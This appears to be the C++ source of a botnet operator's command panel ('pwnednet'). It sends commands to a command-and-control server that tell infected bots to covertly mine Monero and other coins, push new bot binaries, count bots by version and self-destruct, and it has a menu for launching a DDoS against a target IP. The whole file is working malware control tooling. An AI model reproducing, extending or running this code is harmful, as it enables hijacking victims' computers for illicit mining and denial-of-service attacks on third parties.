/*
                                   __              __
     ____ _      ______  ___  ____/ /  ____  ___  / /_
    / __ \ | /| / / __ \/ _ \/ __  /  / __ \/ _ \/ __/
   / /_/ / |/ |/ / / / /  __/ /_/ /  / / / /  __/ /_
  / .___/|__/|__/_/ /_/\___/\__,_/  /_/ /_/\___/\__/
 /_/    by pwned
 
    Command panel
 
 
 TODO
 - In init send post to check if a command is already being executed
 - Rework and optimise the cmd.php and the panel
 
 
 
 
 */

#include "include.h"
#include "connect.h"


int command;
int coin;
int cores;

bool ismining;
bool isddos;
bool isupdating;
bool iskilling = false;

string ddosip;
string cointype;
string killphrase = "yes";

string server   = "https://website.com";
string cncpath  = "/abc/";

int main(int argc, const char * argv[]) {

    getbots();
    
    for(;;) {
        
        menu();
        
        if(command == 0)
            return 0;
        
    }

    
    return 0;
}

void menu() {
    
    getbots();
    
    printHeader();
    
    string br;
    
    if(ismining && !isddos)
        br = "";
    else if (!ismining && isddos)
        br = "\n";
    else if (!ismining && !isddos)
        br = "\n\n\n";
    
    
    printf("Total bots : %i\n%s", bots, br.c_str());
    
    if(ismining) {
        printf("Currently mining %s with %d cores\n%s", cointype.c_str(), cores, isddos ? "" : "\n\n");
    }
    if(isddos) {
        printf("DDOSing target : %s\n\n", ddosip.c_str());
    }
        
    
    printf("[1] %s mining\n",   ismining ? "Stop" : "Start");
    printf("[2] %s DDOS\n",     isddos ? "Stop" : "Start");
    printf("[3] %s updating\n", isupdating ? "Stop" : "Start");
    printf("[4] Stats\n");
    printf("[5] Update panel\n");
    printf("[x] %s killing bots\n", iskilling ? "Stop" : "Start");
    
    printf("\nCommand : ");
    cin >> command;
    
    handleInput();
    
    cout << "\n\n";
    
}

void handleInput() {
    
    // Change to a switch
    
    if(command == 1) {  // Mine
        
        hMining();
        ismining = !ismining;
        
    } else if(command == 2) {
        
        hDdos();
        isddos = !isddos;
        
    } else if(command == 3) {
        
        hUpdate();
        isupdating = !isupdating;
        
    } else if(command == 4) {
    
        hStats();
        
    } else if(command == 111) {
        
        hKill();
        iskilling = !iskilling;
        
    } else { // Update panel
        
        return;
        
    }
    
}

// Handling data

void hMining() {
    
    string mine;
    
    string sendTo = server + cncpath + "commands/mine.php?panel";
    
    if(ismining) {
        
        // If the bots are already mining
        // then tell them to stop mining
        
        mine = post(sendTo.c_str(), "command=mine&enabled=false");;
        
    } else if(!ismining) {
        
        printHeader();
        
        // If the bots are NOT mining then
        // - Ask for the coin type
        // - Ask for the number of cores to mine with
        // - Tell the bots to start mining
        
        printf("\n[1] Monero\n");   // XMR
        printf("[2] Bytecoin\n");   // BCN
        printf("[3] Dashcoin\n");   // DSH
        printf("[4] Quazar\n");     // QCN
        
        printf("\nCoin type : ");
        cin >> coin;
        
        printf("Cores to use : ");
        cin >> cores;
        
        switch (coin) {
            case 1:
                cointype = post(sendTo.c_str(), "coin=xmr");
                cointype = "Monero";
                break;
                
            case 2:
                cointype = post(sendTo.c_str(), "coin=bcn");
                cointype = "Bytecoin";
                break;
                
            case 3:
                cointype = post(sendTo.c_str(), "coin=dsh");
                cointype = "Dashcoin";
                break;
                
            case 4:
                cointype = post(sendTo.c_str(), "coin=qcn");
                cointype = "Quazar";
                break;
                
            case 5:
                cointype = post(sendTo.c_str(), "coin=fcn");
                cointype = "Fantom";
                break;
                
            case 6:
                cointype = post(sendTo.c_str(), "coin=xdn");
                cointype = "DigitalNote";
                break;
                
            case 7:
                cointype = post(sendTo.c_str(), "coin=mcn");
                cointype = "MonetaVerde";
                break;
                
            case 8:
                cointype = post(sendTo.c_str(), "coin=inf");
                cointype = "Infinium";
                break;
                
            default:
                break;
        }
         
        string cmd = "command=cores&enabled=" + to_string(cores);
        string sendcores = post(sendTo.c_str(), cmd.c_str());;
        
        mine = post(sendTo.c_str(), "command=mine&enabled=true");
   
        cout << "Mining " << cointype << " with " << sendcores << " cores\n";
         
    }
    
    cout << mine << endl;

}


void hDdos() {
    
    if(!isddos) {
        cout << "Target IP : ";
        cin >> ddosip;
    }

}


void hUpdate() {
    
    string newbotfile;
    string update;
    
    string sendTo = server + cncpath + "commands/update.php?panel";;
    
    if(!isupdating) {   // Not updating
        
        printf("New filename : ");
        cin >> newbotfile;
        
        string cmd = "command=update&enabled=true&newfile=" + newbotfile;
        
        update = post(sendTo.c_str(), cmd.c_str());
        
        
    } else if(isupdating) {
        
        update = post(sendTo.c_str(), "command=update&enabled=false");
        
    }
    
    cout << update << "\n";

}


void hStats() {
    
    string in;
    string sendTo = server + cncpath + "hub.php?count";
    
    string b1 = post(sendTo.c_str(), "type=cunt&bot=unknown");
    string b2 = post(sendTo.c_str(), "type=cunt&bot=1.2.0");
    string b3 = post(sendTo.c_str(), "type=cunt&bot=1.2.1");
        
    printHeader();
    
    printf("Current version : 1.2.0\n");
    printf("Total unknown bots : %s\n", b1.c_str());
    printf("Total 1.2.0   bots : %s\n", b2.c_str());
    printf("Total 1.2.1   bots : %s\n", b3.c_str());
    printf("\nReturn : ");
    
    cin >> in;
    
    return;
    
}


void hKill() {      // BOT kill.php?execute to kill the bot
    
    string kill = "";
    
    string sendTo = server + cncpath + "commands/kill.php?panel";
    
    if(!iskilling) {
        
        string in;
        printf("Enter kill phrase : "); // Just to stop accidental killing
        cin >> in;
        
        if(in != killphrase) {
            cout << "Incorrect kill phrase\n";
            kill = post(sendTo.c_str(), "enabled=false"); // Set to false if accidental
            return;
        }
        
        kill = post(sendTo.c_str(), "enabled=true");
        
        
    } else if(iskilling) {
        
        kill = post(sendTo.c_str(), "enabled=false");
        
    }
    
    cout << kill << "\n";

}
void printHeader() {
    
    system("clear");
    printf("                                  __              __        \n");
    printf("    ____ _      ______  ___  ____/ /  ____  ___  / /_       \n");
    printf("   / __ \\ | /| / / __ \\/ _ \\/ __  /  / __ \\/ _ \\/ __/  \n");
    printf("  / /_/ / |/ |/ / / / /  __/ /_/ /  / / / /  __/ /_         \n");
    printf(" / .___/|__/|__/_/ /_/\\___/\\__,_/  /_/ /_/\\___/\\__/     \n");
    printf("/_/    created by pwned\n\n");
    
}































// unused shit
/*

 //      printf("[5] Fantom\n");     // FCN
 //      printf("[6] DigitalNote\n");// XDN
 //      printf("[7] MonetaVerde\n");// MCN
 //      printf("[8] Infinium\n");   // INF8





















*/
